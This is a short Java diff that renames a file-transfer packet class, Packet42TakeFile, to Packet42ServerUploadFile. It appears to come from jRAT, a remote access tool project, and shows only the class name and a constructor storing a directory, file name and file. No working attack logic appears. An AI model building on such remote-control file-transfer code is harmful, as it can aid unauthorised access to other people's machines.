@@ -11,13 +11,13 @@ import se.jrat.common.io.TransferListener;
 import se.jrat.common.utils.MathUtils;
 
 
-public class Packet42TakeFile extends AbstractOutgoingPacket {
+public class Packet42ServerUploadFile extends AbstractOutgoingPacket {
 
 	private String dir;
 	private String name;
 	private File file;
 
-	public Packet42TakeFile(String dir, String name, File file) {
+	public Packet42ServerUploadFile(String dir, String name, File file) {
 		this.dir = dir;
 		this.name = name;
 		this.file = file;
